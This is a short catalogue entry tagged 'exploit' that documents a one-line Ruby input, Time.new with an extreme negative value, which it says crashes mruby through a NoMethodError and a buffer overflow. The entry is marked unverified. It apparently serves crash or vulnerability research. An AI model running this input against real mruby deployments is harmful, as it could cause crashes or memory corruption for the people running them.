---
data: Time.new(-0XD00000000000000) & 0
tags:
  - exploit
type: command
executor: ruby
platforms:
  - macOS
id: 20ca3e03-563c-4aea-8aec-29d96cf3b45e
created_at: '2025-12-11T03:47:48.020Z'
updated_at: '2025-12-11T03:47:48.020Z'
verified: false
validated: true
submitted: true
---
# time-new-crash

## Command

```ruby
Time.new(-0XD00000000000000) & 0
```

## Description

Creates a Time object with extreme negative seconds and performs an invalid operation to trigger NoMethodError and buffer overflow in mruby.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-0XD00000000000000` | Extreme negative second value | Yes |

## Examples

### Basic Usage

```ruby
Time.new(-0XD00000000000000) & 0
```

## Expected Output

NoMethodError triggering to_s and potential crash.

## Related

- [[procedures/Create-mruby-Crash-Script]]
- [[procedures/Execute-mruby-Crash-Script]]
